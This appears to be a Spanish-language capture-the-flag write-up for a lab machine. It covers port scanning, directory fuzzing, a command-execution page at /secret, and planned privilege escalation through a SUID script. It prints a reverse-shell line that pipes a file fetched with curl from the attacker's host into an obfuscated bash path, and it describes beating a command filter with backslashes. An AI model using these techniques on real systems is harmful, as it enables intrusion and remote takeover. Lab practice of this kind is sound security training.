### nmap
```python
sudo nmap -p- --open -sS -sCV -n -Pn 10.10.95.51
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-18 18:53 EST
Nmap scan report for 10.10.95.51
Host is up (0.21s latency).
Not shown: 65531 closed tcp ports (reset), 1 filtered tcp port (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.203.6
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Game Info
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.51 seconds
```
### ports: 21/tcp - 22/ssh - 80/http

### Enumeración 80
![[Pasted image 20231118200242.png]]
la pagina principal parace no tener nada importante
### fuzzing con gobuster
![[Pasted image 20231118201742.png]]
### tenemos un monton de directorios pero el que nos llama mas la atencion es /secret asi que vamos a investigar
tenemos una pagina que al parecer nos permite ejecutar codigo
![[Pasted image 20231118202125.png]]
### Al parecer somos el usuario www-data  pero no podemos ejecutar cualquier codigo ya que nos da errores
### despues de una larga busqueda por internet y probar un monton de cosas hemos consegido que interponiendo la barra slash invertido en cada letra de comando al parecer nos deja ejecutarlo. usaremos esto para intentar enviarnos una reverse shell 
![[Pasted image 20231118212931.png]]
### hemos creado un archivo shell.php con una reverse shell y hemos creado un servidor en python para poder conpartirnos el archivo y paralelamente nos hemos puesto a la escucha para poder obtener la shel
```python
	curl 10.8.203.6:8000/shellencod.php | /b?n/ba?h
```
### somos el usuario www-data
hemos intentado hacer tratamiento de tty pero al parecer no podemos. tendremos que hacer movimiento lateral hacia otro usuario para intentarlo de nuevo
![[Pasted image 20231118214103.png]]
### veamos los permisos SUID
![[Pasted image 20231119202137.png]]
al parecer tenemos un script de apaar pero todos pueden ejecutarlo. asi que vamos a aprovechar esto para intentar cambiarlos al usuario apaar.
